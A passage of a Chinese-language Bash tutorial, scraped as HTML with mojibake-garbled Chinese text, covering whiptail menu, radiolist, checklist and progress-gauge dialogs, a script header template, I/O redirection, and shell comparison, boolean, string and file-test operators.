class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628163793208-dd4fec14-bee1-4cef-834f-79a938a3120c.png#clientId=uff91f57e-417a-4&amp;from=paste&amp;height=508&amp;id=uec53f3f8&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=508&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=168365&amp;status=done&amp;style=none&amp;taskId=u526e141f-6c04-496a-abba-00c0fb8177c&amp;width=732" alt="image.png"></p><h3 id="åˆ›å»ºä¸€ä¸ªèœå•æ "><a href="#åˆ›å»ºä¸€ä¸ªèœå•æ " class="headerlink" title="åˆ›å»ºä¸€ä¸ªèœå•æ "></a>åˆ›å»ºä¸€ä¸ªèœå•æ </h3><p>å½“ä½ æƒ³è®©ç”¨æˆ·é€‰æ‹©ä¸€ä¸ªä»»æ„æ•°é‡çš„é€‰æ‹©ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨èœå•æ <br>â€‹</p><p>è¯­æ³•</p><pre class="line-numbers language-bash"><code class="language-bash">whiptail --title <span class="token string">"&lt;menu title>"</span> --menu <span class="token string">"&lt;text to show>"</span> <span class="token operator">&lt;</span>height<span class="token operator">></span> <span class="token operator">&lt;</span>width<span class="token operator">></span> <span class="token operator">&lt;</span>menu height<span class="token operator">></span> <span class="token punctuation">[</span> <span class="token operator">&lt;</span>tag<span class="token operator">></span> <span class="token operator">&lt;</span>item<span class="token operator">></span> <span class="token punctuation">]</span> <span class="token keyword">.</span> <span class="token keyword">.</span> <span class="token keyword">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¤ºä¾‹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>OPTION<span class="token operator">=</span><span class="token punctuation">$(</span>whiptail --title <span class="token string">"Test Menu Dialog"</span> --menu <span class="token string">"Choose your option"</span> 15 60 4 \<span class="token string">"1"</span> <span class="token string">"Grilled Spicy Sausage"</span> \<span class="token string">"2"</span> <span class="token string">"Grilled Halloumi Cheese"</span> \<span class="token string">"3"</span> <span class="token string">"Charcoaled Chicken Wings"</span> \<span class="token string">"4"</span> <span class="token string">"Fried Aubergine"</span>  3<span class="token operator">></span><span class="token operator">&amp;</span>1 1<span class="token operator">></span><span class="token operator">&amp;</span>2 2<span class="token operator">></span><span class="token operator">&amp;</span>3<span class="token punctuation">)</span>exitstatus<span class="token operator">=</span><span class="token variable">$?</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$exitstatus</span> <span class="token operator">=</span> 0 <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"Your chosen option:"</span> <span class="token variable">$OPTION</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"You chose Cancel."</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628163830688-c8e641b9-1431-496f-86c9-7d67aee26883.png#clientId=uff91f57e-417a-4&amp;from=paste&amp;height=505&amp;id=u2ef8e20c&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=505&amp;originWidth=734&amp;originalType=binary%E2%88%B6=1&amp;size=83525&amp;status=done&amp;style=none&amp;taskId=u7d96024a-56a7-4118-b207-58e412f5eef&amp;width=734" alt="image.png"></p><h3 id="åˆ›å»º-radiolist-å•é€‰å¯¹è¯æ¡†"><a href="#åˆ›å»º-radiolist-å•é€‰å¯¹è¯æ¡†" class="headerlink" title="åˆ›å»º radiolist å•é€‰å¯¹è¯æ¡†"></a>åˆ›å»º radiolist å•é€‰å¯¹è¯æ¡†</h3><p>è¯­æ³•</p><pre class="line-numbers language-bash"><code class="language-bash">whiptail --title <span class="token string">"&lt;radiolist title>"</span> --radiolist <span class="token string">"&lt;text to show>"</span> <span class="token operator">&lt;</span>height<span class="token operator">></span> <span class="token operator">&lt;</span>width<span class="token operator">></span> <span class="token operator">&lt;</span>list height<span class="token operator">></span> <span class="token punctuation">[</span> <span class="token operator">&lt;</span>tag<span class="token operator">></span> <span class="token operator">&lt;</span>item<span class="token operator">></span> <span class="token operator">&lt;</span>status<span class="token operator">></span> <span class="token punctuation">]</span> <span class="token keyword">.</span> <span class="token keyword">.</span> <span class="token keyword">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>ç¤ºä¾‹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>DISTROS<span class="token operator">=</span><span class="token punctuation">$(</span>whiptail --title <span class="token string">"Test Checklist Dialog"</span> --radiolist \<span class="token string">"What is the Linux distro of your choice?"</span> 15 60 4 \<span class="token string">"debian"</span> <span class="token string">"Venerable Debian"</span> ON \<span class="token string">"ubuntu"</span> <span class="token string">"Popular Ubuntu"</span> OFF \<span class="token string">"centos"</span> <span class="token string">"Stable CentOS"</span> OFF \<span class="token string">"mint"</span> <span class="token string">"Rising Star Mint"</span> OFF 3<span class="token operator">></span><span class="token operator">&amp;</span>1 1<span class="token operator">></span><span class="token operator">&amp;</span>2 2<span class="token operator">></span><span class="token operator">&amp;</span>3<span class="token punctuation">)</span>exitstatus<span class="token operator">=</span><span class="token variable">$?</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$exitstatus</span> <span class="token operator">=</span> 0 <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"The chosen distro is:"</span> <span class="token variable">$DISTROS</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"You chose Cancel."</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628163873230-5ffe760d-c001-4718-870f-8c3bfc0c38d4.png#clientId=uff91f57e-417a-4&amp;from=paste&amp;height=509&amp;id=u578b84c1&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=509&amp;originWidth=735&amp;originalType=binary%E2%88%B6=1&amp;size=314554&amp;status=done&amp;style=none&amp;taskId=ua3ca19b2-596c-46b3-b64b-304f95fe625&amp;width=735" alt="image.png"></p><h3 id="åˆ›å»ºä¸€ä¸ªå¤šé€‰å¯¹è¯æ¡†"><a href="#åˆ›å»ºä¸€ä¸ªå¤šé€‰å¯¹è¯æ¡†" class="headerlink" title="åˆ›å»ºä¸€ä¸ªå¤šé€‰å¯¹è¯æ¡†"></a>åˆ›å»ºä¸€ä¸ªå¤šé€‰å¯¹è¯æ¡†</h3><p>å½“ä½ æƒ³è®©ç”¨æˆ·é€‰æ‹©ä¸€ä¸ªåˆ—è¡¨ä¸­é€‰æ‹©å¤šä¸ªé€‰é¡¹ï¼Œå¯ä»¥ä½¿ç”¨å¤šé€‰å¯¹è¯æ¡†<br>â€‹</p><p>è¯­æ³•</p><pre class="line-numbers language-bash"><code class="language-bash">whiptail --title <span class="token string">"&lt;checklist title>"</span> --checklist <span class="token string">"&lt;text to show>"</span> <span class="token operator">&lt;</span>height<span class="token operator">></span> <span class="token operator">&lt;</span>width<span class="token operator">></span> <span class="token operator">&lt;</span>list height<span class="token operator">></span> <span class="token punctuation">[</span> <span class="token operator">&lt;</span>tag<span class="token operator">></span> <span class="token operator">&lt;</span>item<span class="token operator">></span> <span class="token operator">&lt;</span>status<span class="token operator">></span> <span class="token punctuation">]</span> <span class="token keyword">.</span> <span class="token keyword">.</span> <span class="token keyword">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>ç¤ºä¾‹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>DISTROS<span class="token operator">=</span><span class="token punctuation">$(</span>whiptail --title <span class="token string">"Test Checklist Dialog"</span> --checklist \<span class="token string">"Choose preferred Linux distros"</span> 15 60 4 \<span class="token string">"debian"</span> <span class="token string">"Venerable Debian"</span> ON \<span class="token string">"ubuntu"</span> <span class="token string">"Popular Ubuntu"</span> OFF \<span class="token string">"centos"</span> <span class="token string">"Stable CentOS"</span> ON \<span class="token string">"mint"</span> <span class="token string">"Rising Star Mint"</span> OFF 3<span class="token operator">></span><span class="token operator">&amp;</span>1 1<span class="token operator">></span><span class="token operator">&amp;</span>2 2<span class="token operator">></span><span class="token operator">&amp;</span>3<span class="token punctuation">)</span>exitstatus<span class="token operator">=</span><span class="token variable">$?</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$exitstatus</span> <span class="token operator">=</span> 0 <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"Your favorite distros are:"</span> <span class="token variable">$DISTROS</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"You chose Cancel."</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628163903130-586dcef6-5637-4ccd-9800-bbe915c495f2.png#clientId=uff91f57e-417a-4&amp;from=paste&amp;height=508&amp;id=uf9ff342b&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=508&amp;originWidth=736&amp;originalType=binary%E2%88%B6=1&amp;size=313912&amp;status=done&amp;style=none&amp;taskId=u5491e5df-4b69-4bcc-88e0-991ee92dfcf&amp;width=736" alt="image.png"></p><h3 id="åˆ›å»ºä¸€ä¸ªè¿›åº¦æ¡"><a href="#åˆ›å»ºä¸€ä¸ªè¿›åº¦æ¡" class="headerlink" title="åˆ›å»ºä¸€ä¸ªè¿›åº¦æ¡"></a>åˆ›å»ºä¸€ä¸ªè¿›åº¦æ¡</h3><p>whiptail ä»æ ‡å‡†è¾“å…¥è¯»å–ä¸€ä¸ªç™¾åˆ†æ•°ï¼ˆ0 ï½ 100ï¼‰ï¼Œä½¿ç”¨è¿›åº¦æ¡æ˜¾ç¤ºç›¸åº”çš„è®¡æ•°<br>â€‹</p><p>è¯­æ³•</p><pre class="line-numbers language-bash"><code class="language-bash">whiptail --gauge <span class="token string">"&lt;test to show>"</span> <span class="token operator">&lt;</span>height<span class="token operator">></span> <span class="token operator">&lt;</span>width<span class="token operator">></span> <span class="token operator">&lt;</span>inital percent<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>ç¤ºä¾‹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">100</span> <span class="token punctuation">;</span> i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">))</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>        <span class="token function">sleep</span> 1        <span class="token keyword">echo</span> <span class="token variable">$i</span>    <span class="token keyword">done</span><span class="token punctuation">}</span> <span class="token operator">|</span> whiptail --gauge <span class="token string">"Please wait while installing"</span> 6 60 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628163942684-40ec2978-0590-4b3d-bed4-6feb45050357.png#clientId=uff91f57e-417a-4&amp;from=paste&amp;height=507&amp;id=ub21196fa&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=507&amp;originWidth=736&amp;originalType=binary%E2%88%B6=1&amp;size=222540&amp;status=done&amp;style=none&amp;taskId=uaf5760e3-94ea-45c0-9cf9-26fde325f12&amp;width=736" alt="image.png"><br>â€‹</p><h2 id="å››ã€æ¨¡æ¿"><a href="#å››ã€æ¨¡æ¿" class="headerlink" title="å››ã€æ¨¡æ¿"></a>å››ã€æ¨¡æ¿</h2><h3 id="æ–‡ä»¶å¤´æ³¨é‡Šæ¨¡æ¿"><a href="#æ–‡ä»¶å¤´æ³¨é‡Šæ¨¡æ¿" class="headerlink" title="æ–‡ä»¶å¤´æ³¨é‡Šæ¨¡æ¿"></a>æ–‡ä»¶å¤´æ³¨é‡Šæ¨¡æ¿</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment" spellcheck="true"># -----------------------------------------</span><span class="token comment" spellcheck="true"># name       : example.sh</span><span class="token comment" spellcheck="true"># createTime : 2025-08-22</span><span class="token comment" spellcheck="true"># author     : birdben</span><span class="token comment" spellcheck="true"># email      : example@163.com</span><span class="token comment" spellcheck="true"># description: shellè„šæœ¬çš„åŠŸèƒ½æè¿°</span><span class="token comment" spellcheck="true"># -----------------------------------------</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>â€‹</p><h2 id="äº”ã€æ ‡å‡†è¾“å…¥è¾“å‡º"><a href="#äº”ã€æ ‡å‡†è¾“å…¥è¾“å‡º" class="headerlink" title="äº”ã€æ ‡å‡†è¾“å…¥è¾“å‡º"></a>äº”ã€æ ‡å‡†è¾“å…¥è¾“å‡º</h2><table><thead><tr><th><strong>è®¾å¤‡</strong></th><th><strong>è®¾å¤‡æ–‡ä»¶å</strong></th><th><strong>æ–‡ä»¶æè¿°ç¬¦</strong></th><th><strong>ç±»å‹</strong></th></tr></thead><tbody><tr><td>é”®ç›˜ âŒ¨ï¸</td><td>/dev/stdin</td><td>0</td><td>æ ‡å‡†è¾“å…¥</td></tr><tr><td>æ˜¾ç¤ºå™¨ ğŸ–¥</td><td>/dev/stdout</td><td>1</td><td>æ ‡å‡†è¾“å‡º</td></tr><tr><td>æ˜¾ç¤ºå™¨ ğŸ–¥</td><td>/dev/stderr</td><td>2</td><td>æ ‡å‡†é”™è¯¯è¾“å‡º</td></tr></tbody></table><h2 id="å…­ã€è¾“å…¥è¾“å‡ºé‡å®šå‘"><a href="#å…­ã€è¾“å…¥è¾“å‡ºé‡å®šå‘" class="headerlink" title="å…­ã€è¾“å…¥è¾“å‡ºé‡å®šå‘"></a>å…­ã€è¾“å…¥è¾“å‡ºé‡å®šå‘</h2><table><thead><tr><th><strong>å‘½ä»¤</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td>command &gt; file</td><td>å°†è¾“å‡ºé‡å®šå‘åˆ° fileã€‚</td></tr><tr><td>command &lt; file</td><td>å°†è¾“å…¥é‡å®šå‘åˆ° fileã€‚</td></tr><tr><td>command &gt;&gt; file</td><td>å°†è¾“å‡ºä»¥è¿½åŠ çš„æ–¹å¼é‡å®šå‘åˆ° fileã€‚</td></tr><tr><td>n &gt; file</td><td>å°†æ–‡ä»¶æè¿°ç¬¦ä¸º n çš„æ–‡ä»¶é‡å®šå‘åˆ° fileã€‚</td></tr><tr><td>n &gt;&gt; file</td><td>å°†æ–‡ä»¶æè¿°ç¬¦ä¸º n çš„æ–‡ä»¶ä»¥è¿½åŠ çš„æ–¹å¼é‡å®šå‘åˆ° fileã€‚</td></tr><tr><td>n &gt;&amp; m</td><td>å°†è¾“å‡ºæ–‡ä»¶ m å’Œ n åˆå¹¶ã€‚</td></tr><tr><td>n &lt;&amp; m</td><td>å°†è¾“å…¥æ–‡ä»¶ m å’Œ n åˆå¹¶ã€‚</td></tr><tr><td>&lt;&lt; tag</td><td>å°†å¼€å§‹æ ‡è®° tag å’Œç»“æŸæ ‡è®° tag ä¹‹é—´çš„å†…å®¹ä½œä¸ºè¾“å…¥ã€‚</td></tr></tbody></table><h2 id="ä¸ƒã€è¿ç®—ç¬¦"><a href="#ä¸ƒã€è¿ç®—ç¬¦" class="headerlink" title="ä¸ƒã€è¿ç®—ç¬¦"></a>ä¸ƒã€è¿ç®—ç¬¦</h2><h3 id="å…³ç³»è¿ç®—ç¬¦"><a href="#å…³ç³»è¿ç®—ç¬¦" class="headerlink" title="å…³ç³»è¿ç®—ç¬¦"></a>å…³ç³»è¿ç®—ç¬¦</h3><p>å…³ç³»è¿ç®—ç¬¦åªæ”¯æŒæ•°å­—ï¼Œä¸æ”¯æŒå­—ç¬¦ä¸²ï¼Œé™¤éå­—ç¬¦ä¸²çš„å€¼æ˜¯æ•°å­—ã€‚<br>ä¸‹è¡¨åˆ—å‡ºäº†å¸¸ç”¨çš„å…³ç³»è¿ç®—ç¬¦ï¼Œå‡å®šå˜é‡ a ä¸º 10ï¼Œå˜é‡ b ä¸º 20ï¼š</p><table><thead><tr><th><strong>è¿ç®—ç¬¦</strong></th><th><strong>è¯´æ˜</strong></th><th><strong>ä¸¾ä¾‹</strong></th></tr></thead><tbody><tr><td>-eq</td><td>æ£€æµ‹ä¸¤ä¸ªæ•°æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰è¿”å› trueã€‚</td><td>[ $a -eq $b ] è¿”å› false</td></tr><tr><td>-ne</td><td>æ£€æµ‹ä¸¤ä¸ªæ•°æ˜¯å¦ä¸ç›¸ç­‰ï¼Œä¸ç›¸ç­‰è¿”å› trueã€‚</td><td>[ $a -ne $b ] è¿”å› true</td></tr><tr><td>-gt</td><td>æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å¤§äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td><td>[ $a -gt $b ] è¿”å› false</td></tr><tr><td>-lt</td><td>æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å°äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td><td>[ $a -lt $b ] è¿”å› true</td></tr><tr><td>-ge</td><td>æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å¤§äºç­‰äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td><td>[ $a -ge $b ] è¿”å› false</td></tr><tr><td>-le</td><td>æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å°äºç­‰äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td><td>[ $a -le $b ] è¿”å› true</td></tr></tbody></table><p>â€‹</p><h3 id="å¸ƒå°”è¿ç®—ç¬¦"><a href="#å¸ƒå°”è¿ç®—ç¬¦" class="headerlink" title="å¸ƒå°”è¿ç®—ç¬¦"></a>å¸ƒå°”è¿ç®—ç¬¦</h3><p>ä¸‹è¡¨åˆ—å‡ºäº†å¸¸ç”¨çš„å¸ƒå°”è¿ç®—ç¬¦ï¼Œå‡å®šå˜é‡ a ä¸º 10ï¼Œå˜é‡ b ä¸º 20ï¼š</p><table><thead><tr><th><strong>è¿ç®—ç¬¦</strong></th><th><strong>è¯´æ˜</strong></th><th><strong>ä¸¾ä¾‹</strong></th></tr></thead><tbody><tr><td>!</td><td>éè¿ç®—ï¼Œè¡¨è¾¾å¼ä¸º true åˆ™è¿”å› falseï¼Œå¦åˆ™è¿”å› trueã€‚</td><td>[ ! false ] è¿”å› trueã€‚</td></tr><tr><td>-o</td><td>æˆ–è¿ç®—ï¼Œæœ‰ä¸€ä¸ªè¡¨è¾¾å¼ä¸º true åˆ™è¿”å› trueã€‚</td><td>[ $a -lt 20 -o $b -gt 100 ] è¿”å› trueã€‚</td></tr><tr><td>-a</td><td>ä¸è¿ç®—ï¼Œä¸¤ä¸ªè¡¨è¾¾å¼éƒ½ä¸º true æ‰è¿”å› trueã€‚</td><td>[ $a -lt 20 -a $b -gt 100 ] è¿”å› falseã€‚</td></tr></tbody></table><p>å®ä¾‹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>a<span class="token operator">=</span>10b<span class="token operator">=</span>20<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token punctuation">]</span><span class="token keyword">then</span>   <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$a</span> != <span class="token variable">$b</span> : a ä¸ç­‰äº b"</span><span class="token keyword">else</span>   <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$a</span> == <span class="token variable">$b</span>: a ç­‰äº b"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$a</span> -lt 100 -a <span class="token variable">$b</span> -gt 15 <span class="token punctuation">]</span><span class="token keyword">then</span>   <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$a</span> å°äº 100 ä¸” <span class="token variable">$b</span> å¤§äº 15 : è¿”å› true"</span><span class="token keyword">else</span>   <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$a</span> å°äº 100 ä¸” <span class="token variable">$b</span> å¤§äº 15 : è¿”å› false"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$a</span> -lt 100 -o <span class="token variable">$b</span> -gt 100 <span class="token punctuation">]</span><span class="token keyword">then</span>   <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$a</span> å°äº 100 æˆ– <span class="token variable">$b</span> å¤§äº 100 : è¿”å› true"</span><span class="token keyword">else</span>   <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$a</span> å°äº 100 æˆ– <span class="token variable">$b</span> å¤§äº 100 : è¿”å› false"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$a</span> -lt 5 -o <span class="token variable">$b</span> -gt 100 <span class="token punctuation">]</span><span class="token keyword">then</span>   <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$a</span> å°äº 5 æˆ– <span class="token variable">$b</span> å¤§äº 100 : è¿”å› true"</span><span class="token keyword">else</span>   <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$a</span> å°äº 5 æˆ– <span class="token variable">$b</span> å¤§äº 100 : è¿”å› false"</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="é€»è¾‘è¿ç®—ç¬¦"><a href="#é€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="é€»è¾‘è¿ç®—ç¬¦"></a>é€»è¾‘è¿ç®—ç¬¦</h3><p>ä»¥ä¸‹ä»‹ç» Shell çš„é€»è¾‘è¿ç®—ç¬¦ï¼Œå‡å®šå˜é‡ a ä¸º 10ï¼Œå˜é‡ b ä¸º 20ï¼š</p><p>| è¿ç®—ç¬¦ | è¯´æ˜       | ä¸¾ä¾‹                                    |<br>| â€”â€” | â€”â€”â€”- | â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” | â€”â€”â€” | â€”â€”â€”â€”- | â€” | â€”â€”â€”â€”â€”â€”â€”â€“ |<br>| &amp;&amp;     | é€»è¾‘çš„ AND | [[$a -lt 100 &amp;&amp; $b -gt 100]] è¿”å› false |<br>|        |            |                                         | é€»è¾‘çš„ OR | [[ $a -lt 100 |     | $b -gt 100 ]] è¿”å› true |</p><h3 id="å­—ç¬¦ä¸²è¿ç®—ç¬¦"><a href="#å­—ç¬¦ä¸²è¿ç®—ç¬¦" class="headerlink" title="å­—ç¬¦ä¸²è¿ç®—ç¬¦"></a>å­—ç¬¦ä¸²è¿ç®—ç¬¦</h3><p>ä¸‹è¡¨åˆ—å‡ºäº†å¸¸ç”¨çš„å­—ç¬¦ä¸²è¿ç®—ç¬¦ï¼Œå‡å®šå˜é‡ a ä¸º â€œabcâ€ï¼Œå˜é‡ b ä¸º â€œefgâ€ï¼š</p><table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th><th>ä¸¾ä¾‹</th></tr></thead><tbody><tr><td>=</td><td>æ£€æµ‹ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰è¿”å› trueã€‚</td><td>[ $a = $b ] è¿”å› falseã€‚</td></tr><tr><td>!=</td><td>æ£€æµ‹ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ç›¸ç­‰ï¼Œä¸ç›¸ç­‰è¿”å› trueã€‚</td><td>[ $a != $b ] è¿”å› trueã€‚</td></tr><tr><td>-z</td><td>æ£€æµ‹å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ä¸º 0ï¼Œä¸º 0 è¿”å› trueã€‚</td><td>[ -z $a ] è¿”å› falseã€‚</td></tr><tr><td>-n</td><td>æ£€æµ‹å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ä¸ä¸º 0ï¼Œä¸ä¸º 0 è¿”å› trueã€‚</td><td>[ -n â€œ$aâ€ ] è¿”å› trueã€‚</td></tr><tr><td>$</td><td>æ£€æµ‹å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºè¿”å› trueã€‚</td><td>[ $a ] è¿”å› trueã€‚</td></tr></tbody></table><h3 id="æ–‡ä»¶æµ‹è¯•è¿ç®—ç¬¦"><a href="#æ–‡ä»¶æµ‹è¯•è¿ç®—ç¬¦" class="headerlink" title="æ–‡ä»¶æµ‹è¯•è¿ç®—ç¬¦"></a>æ–‡ä»¶æµ‹è¯•è¿ç®—ç¬¦</h3><p>æ–‡ä»¶æµ‹è¯•è¿ç®—ç¬¦ç”¨äºæ£€æµ‹ Unix æ–‡ä»¶çš„å„ç§å±æ€§ã€‚<br>å±æ€§æ£€æµ‹æè¿°å¦‚ä¸‹ï¼š</p><table><thead><tr><th><strong>æ“ä½œç¬¦</strong></th><th><strong>è¯´æ˜</strong></th><th><strong>ä¸¾ä¾‹</strong></th></tr></thead><tbody><tr><td>-b file</td><td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯å—è®¾å¤‡æ–‡ä»¶ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td><td>[ -b $file ] è¿”å› falseã€‚</td></tr><tr><td>-c file</td><td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯å­—ç¬¦è®¾å¤‡æ–‡ä»¶ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td><td>[ -c $file ] è¿”å› falseã€‚</td></tr><tr><td>-d file</td><td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯ç›®å½•ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td><td>[ -d $file ] è¿”å› falseã€‚</td></tr><tr><td>-f file</td><td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯æ™®é€šæ–‡ä»¶ï¼ˆæ—¢ä¸æ˜¯ç›®å½•ï¼Œä¹Ÿä¸æ˜¯è®¾å¤‡æ–‡ä»¶ï¼‰ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td><td>[ -f $file ] è¿”å› trueã€‚</td></tr><tr><td>-g file</td><td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦è®¾ç½®äº† SGID ä½ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td><td>[ -g $file ] è¿”å› falseã€‚</td></tr><tr><td>-k file</td><td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦è®¾ç½®äº†ç²˜ç€ä½(Sticky Bit)ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td><td>[ -k $file ] è¿”å› falseã€‚</td></tr><tr><td>-p file</td><td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦æ˜¯æœ‰åç®¡é“ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td><td>[ -p $file ] è¿”å› falseã€‚</td></tr><tr><td>-u file</td><td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦è®¾ç½®äº† SUID ä½ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td><td>[ -u $file ] è¿”å› falseã€‚</td></tr><tr><td>-r file</td><td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦å¯è¯»ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td><td>[ -r $file ] è¿”å› trueã€‚</td></tr><tr><td>-w file</td><td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦å¯å†™ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td><td>[ -w $file ] è¿”å› trueã€‚</td></tr><tr><td>-x file</td><td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦å¯æ‰§è¡Œï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td><td>[ -x $file ] è¿”å› trueã€‚</td></tr><tr><td>-s file</td><td>æ£€æµ‹æ–‡ä»¶æ˜¯å¦ä¸ºç©ºï¼ˆæ–‡ä»¶å¤§å°æ˜¯å¦å¤§äº 0ï¼‰ï¼Œä¸ä¸ºç©ºè¿”å› trueã€‚</td><td>[ -s $file ] è¿”å› trueã€‚</td></tr><tr><td>-e 